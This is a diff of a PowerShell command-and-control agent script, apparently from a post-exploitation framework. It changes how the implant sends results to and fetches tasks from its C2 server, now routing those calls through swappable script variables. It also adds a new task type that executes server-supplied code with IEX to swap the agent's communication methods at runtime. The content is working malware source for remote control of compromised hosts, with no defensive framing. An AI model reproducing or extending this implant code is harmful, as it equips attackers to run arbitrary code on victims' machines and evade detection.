@@ -911,7 +911,7 @@ function Get-FilePart {
                 $msg = "[!] Agent "+$script:SessionID+" exiting"
                 # this is the only time we send a message out of the normal process,
                 #   because we're exited immediately after
-                Send-Message -Packets $(Encode-Packet -type $type -data $msg -ResultID $ResultID)
+                (& $SendMessage -Packets $(Encode-Packet -type $type -data $msg -ResultID $ResultID))
                 exit
             }
             # shell command
@@ -1079,6 +1079,20 @@ function Get-FilePart {
                 }
             }
 
+            elseif($type -eq 130) {
+                #Dynamically update agent comms
+                
+                try {
+                    IEX $data
+
+                    Encode-Packet -type $type -data ("$($ControlServers[0])") -ResultID $ResultID
+                }
+                catch {
+                    
+                    Encode-Packet -type 0 -data ("Unable to update agent comm methods: $_") -ResultID $ResultID
+                }
+            }
+
             else{
                 Encode-Packet -type 0 -data "invalid type: $type" -ResultID $ResultID
             }
@@ -1133,7 +1147,7 @@ function Get-FilePart {
         }
 
         # send all the result packets back to the C2 server
-        Send-Message -Packets $ResultPackets
+        (& $SendMessage -Packets $ResultPackets)
     }
 
 
@@ -1167,7 +1181,7 @@ function Get-FilePart {
 
             # send job results back if there are any
             if ($Packets) {
-                Send-Message -Packets $Packets
+                (& $SendMessage -Packets $Packets)
             }
 
             # send an exit status message and exit
@@ -1177,7 +1191,7 @@ function Get-FilePart {
             else {
                 $msg = "[!] Agent "+$script:SessionID+" exiting: Lost limit reached"
             }
-            Send-Message -Packets $(Encode-Packet -type 2 -data $msg)
+            (& $SendMessage -Packets $(Encode-Packet -type 2 -data $msg))
             exit
         }
 
@@ -1265,11 +1279,11 @@ function Get-FilePart {
         }
 
         if ($JobResults) {
-            Send-Message -Packets $JobResults
+            ((& $SendMessage -Packets $JobResults))
         }
 
         # get the next task from the server
-        $TaskData = Get-Task
+        $TaskData = (& $GetTask)
         if ($TaskData) {
             $script:MissedCheckins = 0
             # did we get not get the default response
